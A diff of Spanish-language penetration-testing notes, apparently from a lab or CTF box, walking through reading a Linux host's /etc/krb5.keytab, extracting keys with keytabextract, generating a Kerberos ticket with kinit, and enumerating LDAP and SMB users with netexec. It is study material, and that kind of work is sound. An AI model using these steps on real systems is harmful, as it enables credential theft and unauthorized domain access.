@@ -11,8 +11,8 @@ NOTA: Se necesita seguir todo el flujo para que funcione el uso del ticket.
 	- /etc/krb5.conf
 	- /etc/krb5.keytab
 
-❯ cat /etc/krb5.conf    # Mirar el contenido de la configuración para despues agregarla a Kali 
-❯ cat /etc/krb5.keytab  # Mirar el contenido 
+❯ cat /etc/krb5.conf    # Mirar el contenido de la configuración para despues copiarla al '/etc/krb5.conf' de Kali 
+❯ cat /etc/krb5.keytab  # Mirar el contenido (Contiene nombre de usuario) - Descargar el archivo a Kali 
 ```
 
 ## Keytab 
@@ -20,6 +20,7 @@ NOTA: Se necesita seguir todo el flujo para que funcione el uso del ticket.
 * [KeyTab](https://github.com/sosdave/KeyTabExtract)
 
 ```bash 
+Paso 1
 # Extraer los datos 
 ❯ python3 keytabextract.py krb5.keytab  
 
@@ -37,6 +38,7 @@ NOTA:
 ❯ ls -la /etc/krb5.conf
 # Verificar si en Kali se tiene el siguiente archivo 
 
+Paso 2:
 ❯ sudo nvim /etc/krb5.conf
 # Si no se tiene se puede crear el archivo y agregar el siguiente contenido:
 ```
@@ -64,11 +66,13 @@ NOTA:
 
 ## Autenticación Kerberos 
 ```bash 
+# Instalación 
 ❯ sudo apt install kinit 
 ❯ sudo apt install krb5-user     # Instalar el cliente 
 ```
 
 ```bash 
+Paso 3:
 # Generar el ticket con Kinit 
 
 ❯ kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM
@@ -82,19 +86,28 @@ NOTA:
 
 ## Enumeración LDAP 
 ```bash 
+Paso 4:
 # Utilizar el ticket importado para enumerar 
 
 ❯ export KRB5CCNAME=/tmp/krb5cc_0 
 # Para usar el ticket con Netexec o Impacket se debe de exportar la variable de entorno 
 
-❯ kvno ldap/IP_DC
+Paso 5:
+❯ kvno ldap/FQDN
 # Solicitar al DC un ticket LDAP para el usuario 
 ```
 
+## Comandos Netexec con el ticket importado 
 ```bash 
-❯ nxc ldap IP_DC -u Brandon_Boyd -k --use-kcache  
+Paso 6:
+
+❯ nxc ldap IP_DC -u user -k --use-kcache  
 	# use-kcache = Indicar el uso de los tickets Kerberos que ya existen en el ccache, en lugar de pedirte una contraseña o utilizar otro método para obtener las credenciales
 
-❯ nxc smb IP_DC -u Brandon_Boyd -k --use-kcache --users  
+❯ nxc smb IP_DC -u user -k --use-kcache --users  
 # Enumerar usuarios utilizaando el ticket importado 
+
+
+NOTA:
+	- Colocar el mismo nombre en user que muestra desde un inico el archivo 'krb5.keytab' incluyendo las mayúsculas y minúsculas
 ```
